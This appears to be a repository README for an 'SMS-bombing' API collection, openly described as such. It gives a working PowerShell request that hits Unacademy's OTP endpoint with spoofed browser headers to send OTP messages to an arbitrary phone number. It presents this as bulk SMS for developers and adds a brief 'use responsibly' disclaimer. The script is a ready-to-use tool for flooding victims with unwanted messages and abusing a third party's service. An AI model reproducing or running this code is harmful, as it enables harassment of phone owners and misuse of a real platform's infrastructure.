# Bombing-Api Collection 🚀
A meticulously curated and continuously updated repository of **SMS-bombing APIs** designed for developers to access various services for sending bulk SMS. Explore the collection below and stay tuned for exciting new additions coming soon! 

## Unacademy SMS API
This API allows sending OTP requests to phone numbers via the Unacademy platform.

### Usage Example (PowerShell)
```powershell
$uri = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
$body = @{
    phone        = "<PHONE_NUMBER>"
    country_code = "IN"
    otp_type     = 1
    email        = ""
    send_otp     = $true
    is_un_teach_user = $false
} | ConvertTo-Json

$headers = @{
    "Origin"     = "https://unacademy.com"
    "Referer"    = "https://unacademy.com/"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "X-Platform" = "0"
}

$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "application/json"
$response | ConvertTo-Json -Depth 6
```

## What's Next?
- More APIs will be added soon to expand your options for bulk SMS services.
- Stay updated for enhanced documentation and additional examples.

*Note*: Use these APIs responsibly and in compliance with applicable laws and terms of service.
